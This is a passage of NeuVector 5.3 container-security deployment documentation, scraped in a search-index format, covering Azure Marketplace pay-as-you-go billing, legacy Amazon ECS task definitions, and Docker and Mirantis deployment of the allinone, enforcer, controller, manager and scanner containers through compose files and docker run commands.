cluster, in order to be able to report the primary and all downstream remote cluster node counts. Do not deploy NeuVector through the marketplace on downstream remote clusters. Use standard deployment methods (Helm, Operator, kubectl etc) described in the NeuVector docs on remote clusters.  Enabling PAYG NeuVector Prime Billing for Existing NeuVector Clusters​  There are several options to enable NeuVector Prime billing on existing NeuVector clusters.  Option 1: The existing cluster must be on a supported PAYG platform. Backup the NeuVector configuration of the existing cluster, remove the NeuVector deployment, then deploy NeuVector through the Azure marketplace. After successful deployment, import the backup configuration. Note: It is recommended that the existing cluster be running version NeuVector 5.2.2 or later before the backup and removal. Option 2: Add the existing cluster as a federated remote cluster to a (existing or newly deployed) primary cluster which already has PAYG billing deployed on it. In this case, the existing cluster can be on any platform supported by NeuVector.  Enabling PAYG NeuVector Prime Billing for Rancher, OpenShift, Tanzu, or other NeuVector supported clusters​  Although PAYG billing deployment is supported on a limited set of Azure platforms (only AKS at initial November 2023 release), billing for other supported NeuVector platforms can be accomplished using the multi-cluster federation configuration. As long as the primary cluster has the PAYG billing deployment of NeuVector, downstream clusters can be any supported NeuVector clusters such as Rancher, Kubernetes, OpenShift, or Tanzu. Downstream clusters can even be on-premise, or on other clouds as long as the remote cluster can be federated to the primary (with appropriate network access).  For Rancher managed downstream clusters with SSO to NeuVector, these clusters can be federated to a non-Rancher primary cluster which is deployed through the Azure marketplace in order to benefit from consolidated multi-cluster billing.  ","version":"5.3","tagName":"h3"},{"title":"Deploying NeuVector Prime through the Azure Marketplace​","type":1,"pageTitle":"Azure Marketplace Billing","url":"/deploying/azuremarketplace#deploying-neuvector-prime-through-the-azure-marketplace","content":" A special billing interface is required to enable PAYG to your Azure account. This must be deployed, together with NeuVector from the Azure Marketplace listing for NeuVector. To deploy the billing adapter and NeuVector see the Usage instructions.  Setting the Admin Password​  It is required to set the admin password in the Azure create offer, &quot;NeuVector Configuration&quot; section. See the Usage instructions on the Azure marketplace listing for NeuVector for instructions.  Console Login through Load Balancer​  If the manager service type was set to Load Balancer during install, an external IP (URL) has been assigned for logging into the NeuVector console. Typically, this URL is accessible from the internet, but your organization may have placed additional restrictions on external access to your cluster. To see the load balancer, type:  kubectl get svc -n neuvector neuvector-service-webui   To get the full login url, type:  SERVICE_IP=$(kubectl get svc --namespace neuvector neuvector-service-webui -o jsonpath=&quot;{.status.loadBalancer.ingress[0].ip}&quot;) echo https://$SERVICE_IP:8443   And you will see something like:  https://&lt;$SERVICE_IP&gt;:8443   This is how you can access the NeuVector console from your browser on the default port 8443.  Once logged in, you can begin to navigate and configure NeuVector.  ","version":"5.3","tagName":"h3"},{"title":"Obtaining Support​","type":1,"pageTitle":"Azure Marketplace Billing","url":"/deploying/azuremarketplace#obtaining-support","content":" Once PAYG billing is enabled for a cluster or multiple clusters, customers are eligible for support through the SUSE Support Center (SCC) service. This is a web-based service for creating, viewing, and managing support requests. The actual link for submitting your support bundle as described below can be found here.  The SCC portal will require you to upload a Support Configuration bundle in order to verify your eligibility as well as provide cluster information required to start investigations. To download the support config, please go to Settings -&gt; Configuration at the bottom of the page for the cluster in question. For multi-cluster configurations, only the Primary cluster's support config is required, even if the support inquiry is for a downstream remote cluster. If you do not have access to the Primary cluster, the remote cluster's support config is acceptable.  ","version":"5.3","tagName":"h3"},{"title":"Upgrading a NeuVector PAYG Cluster​","type":1,"pageTitle":"Azure Marketplace Billing","url":"/deploying/azuremarketplace#upgrading-a-neuvector-payg-cluster","content":" The Azure NeuVector Prime offer consists of several different containers. As newer versions of these containers are released, updated application bundles will be published to the Azure Marketplace. To upgrade to the most recent version that is specified in the marketplace listing, see the Usage instructions. ","version":"5.3","tagName":"h3"},{"title":"Amazon ECS","type":0,"sectionRef":"#","url":"/deploying/ecs","content":"","keywords":"","version":"5.3"},{"title":"Important: Deployment on Amazon ECS is No Longer Supported​","type":1,"pageTitle":"Amazon ECS","url":"/deploying/ecs#important-deployment-on-amazon-ecs-is-no-longer-supported","content":" The reference section below is not being maintained. However, it may provide some assistance in understanding how to deploy the Allinone on ECS.  ","version":"5.3","tagName":"h3"},{"title":"Deploy on AWS Using ECS​","type":1,"pageTitle":"Amazon ECS","url":"/deploying/ecs#deploy-on-aws-using-ecs","content":" This is an example of how to deploy NeuVector using ECS.  note Please see the Kubernetes examples for EKS.  Prepare several Amazon ECS instances which have the Docker engine and ECS agent containers built-in. Pick one node for the management console. Then define Security Group rules that allow inbound TCP port 8443 (NeuVector’s default management console port) for access by your client browser. Define a Security Group that allows TCP and UDP ports on 18300, 18301, 18400, 18401 . This is used by NeuVector enforcers to talk to the Controllers/Allinone. Apply this Security Group to all the ECS instances that will be deploying the NeuVector enforcers and controllers/allinone. Set an attribute on the nodes that you want to deploy NeuVector allinone or controller container. For example, if you want to run NeuVector in a controller HA mode, the recommendation is to pick at least 3 nodes then add the attribute to all of the 3 nodes.  This is how to add attributes to your ECS instances:  Select the instance, then pick “View/Edit Attributes” from the Actions drop down menu.    Then add a new attribute. For example “allinone-node” with value “true”.    Create the Allinone Task Definition. Create a new Task Definition for the Allinone container. You can use the ECS interface to manually create it or paste in the sample JSON file (see below for samples). Refer to section “1. Deploying NeuVector” of these docs for how to configure the Allinone.  Enter the placement constraint. For example, if you used the attribute labeling above, then enter this in the constraint.  attribute:allinone-node=~true     note If you examine the updated JSON file now you’ll see the placement constraint added to it.  Create a new service for the Allinone task. Set the “Placement Templates” to “One Task Per Host” so that only one Allinone/Controller can run on any host. You will also see the constraint will be used “memberOf(attribute:allinone-node=~true) which requires the node to have that attribute.    Now you can deploy the Allinone service. Set the “Number of tasks” to the desired Allinone/Controller number. Now the NeuVector Allinone or Controller containers will start running on the nodes selected. After the Allinone starts running you should be able to connect to the NeuVector console through HTTPS on port 8443. Create the Enforcer Task Definition. This is similar to the Allinone task. Configure manually through the ECS console or use the JSON sample below.  For the Enforcer placement constraint you will require that the Enforcer must NOT be on the same node as the allinone.  attribute:allinone-node!~true     Create a new service for the Enforcer task. Again, set the Task Placement to “One Task Per Host” so only one Enforcer is deployed on each host. Also note the additional constraint should show that it prevents deployment on an allinone node.    Deploy this service with desired number of enforcer nodes in “Number of tasks”. Very shortly all the enforcers will be up and running. From the NeuVector console you will be able to see all nodes being detected with enforcers.  ","version":"5.3","tagName":"h3"},{"title":"Sample ECS JSON Task Definitions​","type":1,"pageTitle":"Amazon ECS","url":"/deploying/ecs#sample-ecs-json-task-definitions","content":" You can use the following samples as starting points for configuring the task definitions for the NeuVector containers.  Create a new task definition, then click Configure Via JSON at bottom. Before pasting in the json below, replace the IP address and image path (find REPLACE in samples). Typically, the IP address would be the Private IP address of the AWS Instance where the allinone will run. You can also specific a different family name than my-allinone/my-enforcer (at the bottom of json).  Sample Allinone json file:  { &quot;networkMode&quot;: &quot;bridge&quot;, &quot;taskRoleArn&quot;: null, &quot;pidMode&quot;: &quot;host&quot;, &quot;containerDefinitions&quot;: [ { &quot;volumesFrom&quot;: [], &quot;memory&quot;: null, &quot;extraHosts&quot;: null, &quot;dnsServers&quot;: null, &quot;disableNetworking&quot;: null, &quot;dnsSearchDomains&quot;: null, &quot;portMappings&quot;: [ { &quot;hostPort&quot;: 18300, &quot;containerPort&quot;: 18300, &quot;protocol&quot;: &quot;tcp&quot; }, { &quot;hostPort&quot;: 18301, &quot;containerPort&quot;: 18301, &quot;protocol&quot;: &quot;tcp&quot; }, { &quot;hostPort&quot;: 18400, &quot;containerPort&quot;: 18400, &quot;protocol&quot;: &quot;tcp&quot; }, { &quot;hostPort&quot;: 18401, &quot;containerPort&quot;: 18401, &quot;protocol&quot;: &quot;tcp&quot; }, { &quot;hostPort&quot;: 18301, &quot;containerPort&quot;: 18301, &quot;protocol&quot;: &quot;udp&quot; }, { &quot;hostPort&quot;: 8443, &quot;containerPort&quot;: 8443, &quot;protocol&quot;: &quot;tcp&quot; }, { &quot;hostPort&quot;: 1443, &quot;containerPort&quot;: 10443, &quot;protocol&quot;: &quot;tcp&quot; } ], &quot;hostname&quot;: null, &quot;essential&quot;: true, &quot;entryPoint&quot;: null, &quot;mountPoints&quot;: [ { &quot;containerPath&quot;: &quot;/lib/modules&quot;, &quot;sourceVolume&quot;: &quot;modules&quot;, &quot;readOnly&quot;: null }, { &quot;containerPath&quot;: &quot;/var/run/docker.sock&quot;, &quot;sourceVolume&quot;: &quot;dockersock&quot;, &quot;readOnly&quot;: null }, { &quot;containerPath&quot;: &quot;/host/proc&quot;, &quot;sourceVolume&quot;: &quot;proc&quot;, &quot;readOnly&quot;: true }, { &quot;containerPath&quot;: &quot;/host/cgroup&quot;, &quot;sourceVolume&quot;: &quot;cgroup&quot;, &quot;readOnly&quot;: true } ], &quot;name&quot;: &quot;allinone&quot;, &quot;ulimits&quot;: null, &quot;dockerSecurityOptions&quot;: null, &quot;environment&quot;: [ { &quot;name&quot;: &quot;CLUSTER_JOIN_ADDR&quot;, &quot;value&quot;: &quot;REPLACE: Private IP&quot; } ], &quot;links&quot;: null, &quot;workingDirectory&quot;: null, &quot;readonlyRootFilesystem&quot;: false, &quot;image&quot;: &quot;REPLACE: Image Path/Name&quot;, &quot;command&quot;: null, &quot;user&quot;: null, &quot;dockerLabels&quot;: { &quot;com.myself.name&quot;: &quot;neuvector&quot; }, &quot;logConfiguration&quot;: null, &quot;cpu&quot;: 0, &quot;privileged&quot;: true, &quot;memoryReservation&quot;: 768 } ], &quot;volumes&quot;: [ { &quot;host&quot;: { &quot;sourcePath&quot;: &quot;/lib/modules&quot; }, &quot;name&quot;: &quot;modules&quot; }, { &quot;host&quot;: { &quot;sourcePath&quot;: &quot;/var/run/docker.sock&quot; }, &quot;name&quot;: &quot;dockersock&quot; }, { &quot;host&quot;: { &quot;sourcePath&quot;: &quot;/proc&quot; }, &quot;name&quot;: &quot;proc&quot; }, { &quot;host&quot;: { &quot;sourcePath&quot;: &quot;/sys/fs/cgroup&quot; }, &quot;name&quot;: &quot;cgroup&quot; } ], &quot;family&quot;: &quot;my-allinone&quot;, &quot;placementConstraints&quot;: [] }   Sample Enforcer json file:  { &quot;networkMode&quot;: &quot;bridge&quot;, &quot;taskRoleArn&quot;: null, &quot;pidMode&quot;: &quot;host&quot;, &quot;containerDefinitions&quot;: [ { &quot;volumesFrom&quot;: [], &quot;memory&quot;: null, &quot;extraHosts&quot;: null, &quot;dnsServers&quot;: null, &quot;disableNetworking&quot;: null, &quot;dnsSearchDomains&quot;: null, &quot;portMappings&quot;: [ { &quot;hostPort&quot;: 18301, &quot;containerPort&quot;: 18301, &quot;protocol&quot;: &quot;tcp&quot; }, { &quot;hostPort&quot;: 18401, &quot;containerPort&quot;: 18401, &quot;protocol&quot;: &quot;tcp&quot; }, { &quot;hostPort&quot;: 18301, &quot;containerPort&quot;: 18301, &quot;protocol&quot;: &quot;udp&quot; } ], &quot;hostname&quot;: null, &quot;essential&quot;: true, &quot;entryPoint&quot;: null, &quot;mountPoints&quot;: [ { &quot;containerPath&quot;: &quot;/lib/modules&quot;, &quot;sourceVolume&quot;: &quot;modules&quot;, &quot;readOnly&quot;: null }, { &quot;containerPath&quot;: &quot;/var/run/docker.sock&quot;, &quot;sourceVolume&quot;: &quot;dockersock&quot;, &quot;readOnly&quot;: null }, { &quot;containerPath&quot;: &quot;/host/proc&quot;, &quot;sourceVolume&quot;: &quot;proc&quot;, &quot;readOnly&quot;: true }, { &quot;containerPath&quot;: &quot;/host/cgroup&quot;, &quot;sourceVolume&quot;: &quot;cgroup&quot;, &quot;readOnly&quot;: true } ], &quot;name&quot;: &quot;enforcer&quot;, &quot;ulimits&quot;: null, &quot;dockerSecurityOptions&quot;: null, &quot;environment&quot;: [ { &quot;name&quot;: &quot;CLUSTER_JOIN_ADDR&quot;, &quot;value&quot;: &quot;REPLACE: Private IP&quot; } ], &quot;links&quot;: null, &quot;workingDirectory&quot;: null, &quot;readonlyRootFilesystem&quot;: false, &quot;image&quot;: &quot;REPLACE: Image Path/Name&quot;, &quot;command&quot;: null, &quot;user&quot;: null, &quot;dockerLabels&quot;: { &quot;com.myself.name&quot;: &quot;neuvector&quot; }, &quot;logConfiguration&quot;: null, &quot;cpu&quot;: 0, &quot;privileged&quot;: true, &quot;memoryReservation&quot;: 512 } ], &quot;volumes&quot;: [ { &quot;host&quot;: { &quot;sourcePath&quot;: &quot;/lib/modules&quot; }, &quot;name&quot;: &quot;modules&quot; }, { &quot;host&quot;: { &quot;sourcePath&quot;: &quot;/var/run/docker.sock&quot; }, &quot;name&quot;: &quot;dockersock&quot; }, { &quot;host&quot;: { &quot;sourcePath&quot;: &quot;/proc&quot; }, &quot;name&quot;: &quot;proc&quot; }, { &quot;host&quot;: { &quot;sourcePath&quot;: &quot;/sys/fs/cgroup&quot; }, &quot;name&quot;: &quot;cgroup&quot; } ], &quot;family&quot;: &quot;my-enforcer&quot;, &quot;placementConstraints&quot;: [] }   ","version":"5.3","tagName":"h3"},{"title":"Live Updating NeuVector​","type":1,"pageTitle":"Amazon ECS","url":"/deploying/ecs#live-updating-neuvector","content":" You can do a live update of the NeuVector containers in ECS without interrupting services. NeuVector’s services can be easily updated or upgraded without interrupting any running services. To do that in Amazon ECS:  If you have multiple controllers or Allinones deployed as a cluster, ignore this step. If there is only a single Allinone/controller in the system, find a new ECS instance and deploy a 2nd Allinone/controller container on it (follow the NeuVector allinone/controller ECS deployment steps). After deployed, in the NeuVector management console, you will see this new controller up and running (under Resources &gt; Controllers). This is required so that all stateful data is replicated between controllers. In ECS Services, reset and delete the old Allinone/controller service. Pull the updated NeuVector images manually or trigger AWS ECS to pull new versions of Allinone/controller containers from Dockerhub or your private registry. Create a new revision of the Allinone/Controller task, update the “CLUSTER_JOIN_ADDR” to the 2nd Allinone/controller’s private node IP address. Create a new service to deploy this new task (follow the same steps to deploy on ECS). After completed, the new version of the Allinone/controller should be up and running. From the NeuVector management console, all the logs and policies should still be there. Optionally, you can bring down the 2nd Allinone/Controller container now since there should be a Allinone/Controller now started on the original node. From ECS Services, shutdown and update the Enforcers. Manually or auto-trigger the pulling of new Enforcer images. Then restart or update the Enforcer on all nodes. From the NeuVector console, you will see all Enforcers are up to date. If you are using the separate Manager container instead of the Allinone (which already has the manager in it), simply shutdown and remove the old manager container. Then pull the new manager version, and deploy it, pointing the CLUSTER_JOIN_ADDR to the IP of the controller.  All NeuVector containers are now updated live. All policies, logs, and configurations are unaffected. The live graph view will be regenerated automatically as soon as there is new live traffic flowing between containers. ","version":"5.3","tagName":"h3"},{"title":"Docker & Mirantis Kubernetes Engine","type":0,"sectionRef":"#","url":"/deploying/docker","content":"","keywords":"","version":"5.3"},{"title":"Kubernetes Deployment on Mirantis Kubernetes Engine​","type":1,"pageTitle":"Docker & Mirantis Kubernetes Engine","url":"/deploying/docker#kubernetes-deployment-on-mirantis-kubernetes-engine","content":" Follow the instructions in the Kubernetes section.  note NeuVector does not support mixed Kubernetes / Swarm clusters.  ","version":"5.3","tagName":"h3"},{"title":"Deploy NeuVector Containers Using Docker Native or UCP/Swarm​","type":1,"pageTitle":"Docker & Mirantis Kubernetes Engine","url":"/deploying/docker#deploy-neuvector-containers-using-docker-native-or-ucpswarm","content":" Note that native Docker deployment on Mirantis Kubernetes Engine using Swarm DOES NOT support deployment of services with containers in privileged mode, or with seccomp capabilities added. To deploy in this environment, you must use Docker Compose or Run to deploy the NeuVector containers. You can use the remote host deployment (docker-compose -H HOST) to make this task easier.  Here are the sample docker compose configuration files. Note that using docker native does not support deploying the enforcer on the same node as the controller, requiring the use of the Allinone container if controller and enforcer functions are desired on a node.  Note: The environment variable NV_PLATFORM_INFO=platform=Docker is used to notify NeuVector that the platform is Docker/Swarm, even though there may be unused Kubernetes containers detected by NeuVector on a Docker EE deployment. Also to be able to see these in Network Activity -&gt; View -&gt; Show System, add the environment variable for the Enforcer NV_SYSTEM_GROUPS.  Deploy Allinone for High Availability​  For HA in production Docker native or EE environments, deploy the Allinone container on the first three production hosts. Each Allinone should point to the IP addresses of all Allinone hosts. For example, three Allinone containers is the minimum for HA, and the CLUSTER_JOIN_ADDR should list the three IP addresses separated by comma's. Additional HA Allinone's can be deployed in odd numbers, e.g. 5, 7. The deploy the Enforcer on the remaining hosts in the cluster, in any.  Deploy Allinone using docker-compose (privileged mode)​  The following is an example of the docker-compose file to deploy the allinone container on the first node. Because the allinone container has an enforcer module inside, application containers on the same node can be secured. Both greenfield and brownfield deployment are supported.  allinone: pid: host image: neuvector/allinone:&lt;version&gt; container_name: allinone privileged: true environment: - CLUSTER_JOIN_ADDR=node_ip - NV_PLATFORM_INFO=platform=Docker ports: - 18300:18300 - 18301:18301 - 18400:18400 - 18401:18401 - 18301:18301/udp - 8443:8443 volumes: - /lib/modules:/lib/modules:ro - /var/neuvector:/var/neuvector - /var/run/docker.sock:/var/run/docker.sock:ro - /proc:/host/proc:ro - /sys/fs/cgroup:/host/cgroup:ro   The most important environment variable is the CLUSTER_JOIN_ADDR. It is the IP address that other enforcers connect to. Normally, it should be set to the IP address of the node where all-in-one container is running.  Port 18300 and 18301 are default ports for cluster communication. They must be identical for all controllers and enforcers in the cluster. Please refer to &quot;Docker-compose Details&quot; section for how to change the default ports.  Note: To expose the REST API in the Allinone, add the port map for 10443, for example - 10443:10443.  Add an enforcer container using docker-compose (privileged mode)​  This is an example of docker-compose file to join an enforcer into the cluster. Both greenfield and brownfield deployment are supported.  enforcer: pid: host image: neuvector/enforcer:&lt;version&gt; container_name: enforcer privileged: true environment: - CLUSTER_JOIN_ADDR=controller_node_ip - NV_PLATFORM_INFO=platform=Docker ports: - 18301:18301 - 18401:18401 - 18301:18301/udp volumes: - /lib/modules:/lib/modules:ro - /var/run/docker.sock:/var/run/docker.sock:ro - /proc:/host/proc:ro - /sys/fs/cgroup/:/host/cgroup/:ro   The most important environment variable is CLUSTER_JOIN_ADDR. For enforcers, replace &lt;controller_node_ip&gt; with the controller's node IP address. Typically, CLUSTER_JOIN_ADDR in the controller/all-in-one's docker-compose file and enforcer's docker-compose file have the same value.  Deploy the NeuVector Scanner Container​  From NeuVector 4.0+, a separate scanner container must be deployed to perform vulnerability scanning. Important: Always use the :latest tag when pulling and running the scanner image to ensure the latest CVE database is deployed.  Sample docker run to deploy the scanner on the same host as the controller  docker run -td --name scanner -e CLUSTER_JOIN_ADDR=controller_node_ip -p 18402:18402 -v /var/run/docker.sock:/var/run/docker.sock:ro neuvector/scanner:latest   And sample docker-compose  Scanner: image: neuvector/scanner:latest container_name: scanner environment: - CLUSTER_JOIN_ADDR=controller_node_ip ports: - 18402:18402 volumes: - /var/run/docker.sock:/var/run/docker.sock:ro   To deploy the scanner on a different host than the controller, add the environment variable CLUSTER_ADVERTISED_ADDR so the controller can reach the scanner.  docker run -td --name scanner -e CLUSTER_JOIN_ADDR=controller_node_ip -e CLUSTER_ADVERTISED_ADDR=scanner_host_ip -p 18402:18402 -v /var/run/docker.sock:/var/run/docker.sock:ro neuvector/scanner:latest   To deploy multiple scanners on the same host as the controller, remove the port mapping and CLUSTER_ADVERTISED_ADDR environment variable.  docker run -itd --name s1 -e CLUSTER_JOIN_ADDR=controller_node_ip neuvector/scanner:latest   Where s1 is scanner 1 (use s2, s3 etc for each additional scanner).  To deploy a stand alone scanner (no controller/allinone), please see the section Parallel and Standalone Scanners.  To update the Scanner in order to get the latest CVE database updates from NeuVector, create a cron job to stop and restart the scanner, pulling the latest. See this section for details.  Deployment Without Using Privileged Mode​  For some platform configurations it is possible to deploy the NeuVector containers without requiring them to run in privileged mode. The configuration must support the ability to add capabilities and set the apparmor profile. Note that Docker DataCenter/UCP and Swarm currently do not support this, but it is still possible to deploy NeuVector manually using Compose or Run.  Deploy allinone (NO privileged mode) with docker-compose​  allinone: pid: host image: neuvector/allinone:&lt;version&gt; container_name: neuvector.allinone cap_add: - SYS_ADMIN - NET_ADMIN - SYS_PTRACE - IPC_LOCK security_opt: - apparmor=unconfined - seccomp=unconfined - label=disable environment: - CLUSTER_JOIN_ADDR=[AllInOne Node IP Address] - NV_PLATFORM_INFO=platform=Docker ports: - 18300:18300 - 18301:18301 - 18400:18400 - 18401:18401 - 18301:18301/udp - 8443:8443 volumes: - /lib/modules:/lib/modules:ro - /var/run/docker.sock:/var/run/docker.sock:ro - /proc:/host/proc:ro - /sys/fs/cgroup:/host/cgroup:ro - /var/neuvector:/var/neuvector   Deploy enforcer (NO privileged mode) with docker-compose​  enforcer: pid: host image: neuvector/enforcer:&lt;version&gt; container_name: neuvector.enforcer cap_add: - SYS_ADMIN - NET_ADMIN - SYS_PTRACE - IPC_LOCK security_opt: - apparmor=unconfined - seccomp=unconfined - label=disable environment: - CLUSTER_JOIN_ADDR=[AllInOne Node IP Address] - NV_PLATFORM_INFO=platform=Docker ports: - 18301:18301 - 18401:18401 - 18301:18301/udp volumes: - /lib/modules:/lib/modules:ro - /var/run/docker.sock:/var/run/docker.sock:ro - /proc:/host/proc:ro - /sys/fs/cgroup/:/host/cgroup/:ro   Deploy allinone (privileged mode) with docker run​  You can use docker run instead of compose to deploy. Here are samples.  docker run -d --name allinone \\ --pid=host \\ --privileged \\ -e CLUSTER_JOIN_ADDR=[AllInOne Node IP Address] \\ -e NV_PLATFORM_INFO=platform=Docker \\ -p 18300:18300 \\ -p 18301:18301 \\ -p 18400:18400 \\ -p 18401:18401 \\ -p 18301:18301/udp \\ -p 8443:8443 \\ -v /lib/modules:/lib/modules:ro \\ -v /var/neuvector:/var/neuvector \\ -v /var/run/docker.sock:/var/run/docker.sock:ro \\ -v /sys/fs/cgroup:/host/cgroup:ro \\ -v /proc:/host/proc:ro \\ neuvector/allinone:&lt;version&gt;   Deploy enforcer (privileged mode) with docker run​  docker run -d --name enforcer \\ --pid=host \\ --privileged \\ -e CLUSTER_JOIN_ADDR=[AllInOne Node IP Address] \\ -e NV_PLATFORM_INFO=platform=Docker \\ -p 18301:18301 \\ -p 18401:18401 \\ -p 18301:18301/udp \\ -v /lib/modules:/lib/modules:ro \\ -v /var/run/docker.sock:/var/run/docker.sock:ro \\ -v /sys/fs/cgroup:/host/cgroup:ro \\ -v /proc:/host/proc:ro \\ neuvector/enforcer:&lt;version&gt;   Deploy allinone (NO privileged mode) with docker run​  You can use docker run instead of compose to deploy. Here are samples.  docker run -d --name allinone \\ --pid=host \\ --cap-add=SYS_ADMIN \\ --cap-add=NET_ADMIN \\ --cap-add=SYS_PTRACE \\ --cap-add=IPC_LOCK \\ --security-opt label=disable \\ --security-opt apparmor=unconfined \\ --security-opt seccomp=unconfined \\ -e CLUSTER_JOIN_ADDR=[AllInOne Node IP Address] \\ -e NV_PLATFORM_INFO=platform=Docker \\ -p 18300:18300 \\ -p 18301:18301 \\ -p 18400:18400 \\ -p 18401:18401 \\ -p 18301:18301/udp \\ -p 8443:8443 \\ -v /lib/modules:/lib/modules:ro \\ -v /var/neuvector:/var/neuvector \\ -v /var/run/docker.sock:/var/run/docker.sock:ro \\ -v /sys/fs/cgroup:/host/cgroup:ro \\ -v /proc:/host/proc:ro \\ neuvector/allinone:&lt;version&gt;   Deploy enforcer (NO privileged mode) with docker run​  docker run -d --name enforcer \\ --pid=host \\ --cap-add=SYS_ADMIN \\ --cap-add=NET_ADMIN \\ --cap-add=SYS_PTRACE \\ --cap-add=IPC_LOCK \\ --security-opt label=disable \\ --security-opt apparmor=unconfined \\ --security-opt seccomp=unconfined \\ -e CLUSTER_JOIN_ADDR=[AllInOne Node IP Address] \\ -e NV_PLATFORM_INFO=platform=Docker \\ -p 18301:18301 \\ -p 18401:18401 \\ -p 18301:18301/udp \\ -v /lib/modules:/lib/modules:ro \\ -v /var/run/docker.sock:/var/run/docker.sock:ro \\ -v /sys/fs/cgroup:/host/cgroup:ro \\ -v /proc:/host/proc:ro \\ neuvector/enforcer:&lt;version&gt;   ","version":"5.3","tagName":"h3"},{"title":"Deploy Separate NeuVector Components on Different Hosts​","type":1,"pageTitle":"Docker & Mirantis Kubernetes Engine","url":"/deploying/docker#deploy-separate-neuvector-components-on-different-hosts","content":" If planning to dedicate a docker host to a Controller and/or Manager (no Enforcer) these containers can be deployed individually instead of the Allinone. Note that docker does not support deploying the enforcer on the same node as the controller as separate components, requiring the use of the Allinone container if controller and enforcer functions are desired on a node.  Controller compose file (replace [controller IP] with IP of the first controller node)  controller: image: neuvector/controller:&lt;version&gt; container_name: controller pid: host privileged: true environment: - CLUSTER_JOIN_ADDR=[controller IP] - NV_PLATFORM_INFO=platform=Docker ports: - 18300:18300 - 18301:18301 - 18400:18400 - 18401:18401 - 18301:18301/udp - 10443:10443 volumes: - /var/run/docker.sock:/var/run/docker.sock:ro - /proc:/host/proc:ro - /sys/fs/cgroup:/host/cgroup:ro - /var/neuvector:/var/neuvector   Docker run can also be used, for example  docker run -itd --privileged --name neuvector.controller -e CLUSTER_JOIN_ADDR=controller_ip -p 18301:18301 -p 18301:18301/udp -p 18300:18300 -p 18400:18400 -p 10443:10443 -v /var/neuvector:/var/neuvector -v /var/run/docker.sock:/var/run/docker.sock:ro -v /proc:/host/proc:ro -v /sys/fs/cgroup/:/host/cgroup/:ro neuvector/controller:&lt;version&gt;   Manager compose file (replace [controller IP] with IP of controller node to connect to). The Docker UCP HRM service uses the default port 8443 which conflicts with the NeuVector console port. If using the default HRM port, then change the NeuVector port mapping in the example below to another port, for example 9443:8443 for the manager container as shown below.  manager: image: neuvector/manager:&lt;version&gt; container_name: nvmanager environment: - CTRL_SERVER_IP=[controller IP] ports: - 9443:8443   The compose file for the Enforcer:  enforcer: image: neuvector/enforcer:&lt;version&gt; pid: host container_name: enforcer privileged: true environment: - CLUSTER_JOIN_ADDR=controller_node_ip - NV_PLATFORM_INFO=platform=Docker ports: - 18301:18301 - 18401:18401 - 18301:18301/udp volumes: - /lib/modules:/lib/modules:ro - /var/run/docker.sock:/var/run/docker.sock:ro - /proc:/host/proc:ro - /sys/fs/cgroup/:/host/cgroup/:ro   ","version":"5.3","tagName":"h3"},{"title":"Monitoring and Restarting NeuVector​","type":1,"pageTitle":"Docker & Mirantis Kubernetes Engine","url":"/deploying/docker#monitoring-and-restarting-neuvector","content":" Since the NeuVector containers are not deployed as a UCP/Swarm service, they are not automatically started/restarted on nodes. You should set up alerting through your SIEM system for NeuVector SYSLOG events or through DataCenter to detect if a NeuVector container is not running.  ","version":"5.3","tagName":"h3"},{"title":"Deploying Without Privileged Mode​","type":1,"pageTitle":"Docker & Mirantis Kubernetes Engine","url":"/deploying/docker#deploying-without-privileged-mode","content":" In general you’ll need to replace the privileged setting with:   cap_add: - SYS_ADMIN - NET_ADMIN - SYS_PTRACE - IPC_LOCK security_opt: - apparmor=unconfined - seccomp=unconfined - label=disable   The above syntax is for Docker EE v17.06.0+. Versions prior to this use the : instead of =, for example apparmor:unconfined.  ","version":"5.3","tagName":"h3"},{"title":"Docker Native Updates​","type":1,"pageTitle":"Docker & Mirantis Kubernetes Engine","url":"/deploying/docker#docker-native-updates","content":" important Always use the :latest tag when pulling and running the scanner image to ensure the latest CVE database is deployed.  docker stop scanner docker rm &lt;scanner id&gt; docker pull neuvector/scanner:latest &lt;docker run command from below&gt;   note docker rm -f &lt;scanner id&gt; can also be used to force stop and removal of the running scanner. For docker-compose docker-compose -f file.yaml down docker-compose -f file.yaml pull // pre-pull the image before starting the scanner docker-compose -f file.yaml up -d Sample docker run docker run -td --name scanner -e CLUSTER_JOIN_ADDR=controller_node_ip -e CLUSTER_ADVERTISED_ADDR=node_ip -e SCANNER_DOCKER_URL=tcp://192.168.1.10:2376 -p 18402:18402 -v /var/run/docker.sock:/var/run/docker.sock:ro neuvector/scanner:latest And sample docker-compose Scanner: image: neuvector/scanner:latest container_name: scanner environment: - SCANNER_DOCKER_URL=tcp://192.168.1.10:2376 - CLUSTER_JOIN_ADDR=controller_node_ip - CLUSTER_ADVERTISED_ADDR=node_ip ports: - 18402:18402 volumes: - /var/run/docker.sock:/var/run/docker.sock:ro  ","version":"5.3","tagName":"h3"},{"title":"Deploying NeuVector","type":0,"sectionRef":"#","url":"/deploying/production","content":"","keywords":"","version":"5.3"},{"title":"Planning Deployments​","type":1,"pageTitle":"Deploying NeuVector","url":"/deploying/production#planning-deployments","content":" The NeuVector containers in a default deployment include the controller, manager, enforcer, scanner, and updater. Placement of where these containers (on which nodes) are deployed must be considered, and appropriate labels, taints or tolerations created to control them.  The enforcer should be deployed on every host/node where application containers to be monitored and protected by NeuVector will be running.  The controller manages the cluster of enforcers, and can be deployed on the same node as an enforcer or on a separate management node. The manager should be deployed on the node where the controller is running, and will provide console access to the controller. Other required NeuVector containers such as the manager, scanner, and updater are described in more detail in the Best Practices guide referenced below.  If you haven’t done so, pull the images from the NeuVector Docker Hub.  The images are on the NeuVector Docker Hub registry. Use the appropriate version tag for the manager, controller, enforcer, and leave the version as 'latest' for scanner and updater. For example:  neuvector/manager:5.3.2neuvector/controller:5.3.2neuvector/enforcer:5.3.2neuvector/scanner:latestneuvector/updater:latest  Please be sure to update the image references in appropriate yaml files.  If deploying with the current NeuVector Helm chart (v1.8.9+), the following changes should be made to values.yml:  Update the registry to docker.ioUpdate image names/tags to the current version on Docker Hub, as shown aboveLeave the imagePullSecrets empty  Best Practices, Tips, Q&amp;A for Deploying and Managing NeuVector​  Download and review this Deployment Best Practices document for tips such as performance and sizing, best practices, and frequently asked questions about deployments.  ","version":"5.3","tagName":"h3"},{"title":"Deployment Using Helm or Operators​","type":1,"pageTitle":"Deploying NeuVector","url":"/deploying/production#deployment-using-helm-or-operators","content":" Automated deployment using Helm can be found at https://github.com/neuvector/neuvector-helm.  Deployment using an Operator, including RedHat Certified Operator and Kubernetes community operator is supported, with a general description here. The NeuVector RedHat operator is at https://access.redhat.com/containers/#/registry.connect.redhat.com/neuvector/neuvector-operator, and the community operator at https://operatorhub.io/operator/neuvector-operator.  